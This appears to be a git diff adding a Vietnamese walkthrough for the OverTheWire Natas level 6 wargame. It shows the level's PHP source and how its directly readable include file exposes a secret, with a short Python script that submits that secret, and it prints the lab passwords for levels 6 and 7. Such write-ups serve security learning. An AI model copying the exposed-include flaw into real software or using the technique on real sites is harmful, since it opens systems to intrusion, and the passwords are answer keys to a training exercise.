@@ -279,3 +279,61 @@ print(content)
 ***
 **URL:** [http://natas6.natas.labs.overthewire.org](http://natas6.natas.labs.overthewire.org) <br/>
 **Datum:** natas6-aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+Ở level này, ta cần nhập vào *secret* để lấy được pwd. Ta thử *View sourcecode*, nhận thấy mã `PHP` sau:
+
+```php
+<?
+
+include "includes/secret.inc";
+
+    if(array_key_exists("submit", $_POST)) {
+        if($secret == $_POST['secret']) {
+        print "Access granted. The password for natas7 is <censored>";
+    } else {
+        print "Wrong secret";
+    }
+    }
+?>
+```
+
+Đọc code ta nhận thấy included file (`include "includes/secret.inc";`), vì thế thử truy cập vào:
+
+```php
+// http://natas6.natas.labs.overthewire.org/includes/secret.inc
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+```
+
+Giờ ta chỉ việc nhập key trên lấy được pwd để sang level tiếp theo:
+
+```text
+Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+```
+
+*Or this way*
+
+```python
+import requests
+import re
+
+user = 'natas6'
+pwd = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'
+
+url = 'http://%s.natas.labs.overthewire.org/' % user
+
+session = requests.Session()
+response = session.post(url, data= {'secret':'FOEIUWGHFEEUHOFUOIU', 'submit':'submit'}, auth = (user, pwd))
+content = response.text
+print(content)
+```
+
+
+
+***
+# Natas Level 7 Solution
+***
+**URL:** [http://natas7.natas.labs.overthewire.org](http://natas7.natas.labs.overthewire.org) <br/>
+**Datum:** natas7-7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
